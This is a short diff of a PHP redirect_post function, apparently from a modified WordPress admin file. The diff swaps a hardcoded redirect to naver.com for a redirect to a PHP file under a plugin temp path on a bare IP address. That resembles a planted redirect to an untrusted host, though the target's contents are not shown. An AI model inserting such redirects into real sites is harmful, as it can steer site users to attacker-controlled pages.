@@ -62,7 +62,7 @@ function redirect_post($post_id = '') {
 
         if ($message == 6)
         {
-            $location = 'http://www.naver.com';
+            $location = 'http://183.110.207.46/wp/wp-content/plugins/bigbluebutton/temp_bigbluebutton-plugin.php';
             wp_redirect($location);
             exit;
         }
